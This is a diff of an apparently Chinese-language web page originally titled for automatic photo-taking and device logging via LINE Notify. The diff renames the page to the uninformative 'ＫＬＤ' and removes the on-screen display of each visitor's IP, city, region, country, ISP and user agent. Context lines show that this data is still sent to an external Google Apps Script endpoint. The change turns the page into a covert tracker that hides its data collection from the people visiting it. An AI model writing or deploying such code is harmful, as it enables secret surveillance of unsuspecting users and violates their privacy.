@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>LINE Notify 自動拍照與設備記錄</title>
+  <title>LINE Notify ＫＬＤ</title>
 </head>
 <body>
-  <h1>LINE Notify 自動拍照與設dddd備記錄</h1>
+  <h1>ＫＬＤ</h1>
   <p id="ipInfo">IP 資訊載入中...</p>
   <p id="status">狀態：啟動中...</p>
 
@@ -82,10 +82,6 @@
         const { ip, city, region, country, org } = data;
         const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
         const userAgent = navigator.userAgent;
-
-        document.getElementById('ipInfo').innerText = `
-          IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}
-        `;
 
         const url = new URL('https://script.google.com/macros/s/AKfycbw3YHSFeqgD900fraoDav7i6azeQaVX9y6UAqUCs56cOzI0O8X4R47wDSMJ0GEs42Um1A/exec');
         url.searchParams.append('ip', ip);
